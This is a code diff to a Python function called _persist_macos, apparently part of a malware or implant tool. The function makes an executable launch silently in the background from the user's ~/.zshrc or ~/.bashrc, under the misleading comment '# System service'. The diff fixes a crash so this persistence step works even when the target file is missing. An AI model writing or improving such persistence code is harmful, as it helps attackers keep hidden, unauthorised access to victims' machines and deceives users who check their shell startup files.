@@ -384,8 +384,10 @@ def _persist_macos(method, exe_path):
         zshrc = os.path.expanduser("~/.zshrc")
         entry = f"\n# System service\nnohup {sys.executable} {exe_path} > /dev/null 2>&1 &\n"
         target = zshrc if os.path.exists(zshrc) else os.path.expanduser("~/.bashrc")
-        with open(target, "r") as f:
-            content = f.read()
+        content = ""
+        if os.path.exists(target):
+            with open(target, "r") as f:
+                content = f.read()
         if exe_path not in content:
             with open(target, "a") as f:
                 f.write(entry)
